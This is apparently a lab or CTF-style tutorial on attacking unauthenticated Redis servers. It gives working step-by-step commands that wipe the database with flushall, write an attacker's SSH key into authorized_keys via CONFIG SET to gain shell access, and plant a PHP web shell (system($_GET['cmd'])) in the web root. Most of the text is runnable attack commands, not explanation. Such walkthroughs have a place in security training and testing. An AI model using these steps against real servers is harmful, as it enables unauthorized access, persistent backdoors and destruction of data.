# Attacking

## What is Redis
Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries.

## Enumerating Redis
In a standard Redis configuration, Redis is located by default on port 6379. You can connect to Redis from the command line using Telnet like so:

	telnet 10.10.206.170 6379

Once you're in a telnet session, you can check to see if the instance is using AUTH to set a password, or if the command access is unprotected. A good way to do this is simply by echoing a message, like:

	echo "Hey no AUTH required!"

You should have the message return along with a $xyz value.

## Writing SSH Keys
If this is the case, we can drop SSH keys onto Redis to get a shell. To do this, first generate an SSH key and save it to a directory of your choosing:

	ssh-keygen -t rsa -C "crack@redis.io"

Now we've got a key. The goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. 

To start let’s pad the public SSH key we generated with newlines before and after the content:

	(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt

Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using redis-cli. First, we remove any current data in the memory:

	redis-cli -h 10.10.206.170 flushall

Then, we write our file to the memory.

	cat foo.txt | redis-cli -h 10.10.206.170 -x set crackit

Then, we can dump the memory content to a file using:

	redis-cli -h 10.10.206.170
	config set dir /Users/antirez/.ssh/
	config get dir
	config set dbfilename "authorized_keys"
	save

Then we should be able to SSH into the machine using:

	ssh -i id_rsa antirez@10.10.206.170

## PHP Webshell
To do this you must know the path of the Website folder. Check the web server using manual enumeration or a tool like "whatweb" to establish the probable web server. For example, if it's apache- we can assume the path is /var/www/html.

Using this assumption, we can then set the directory and write to a file.  To test if it works, we can connect over telnet, as previously shown. Then, using the commands:

	config set dir /var/www/html
	config set dbfilename configinfo.php
	set test "<?php phpinfo(); ?>"
	save

We can check to see if we're able to write a php info file, to check this- go to the webserver and check "/configinfo.php". If we're met with a PHPInfo page, then we know we're able to write files.

We can then add in a php get variable web shell:

	config set dir /var/www/html
	config set dbfilename shell.php
	set test "<?php system($_GET['cmd']); ?>"
	save

Using this, we can further enumerate and maybe get credentials or a shell using nc or bash. 
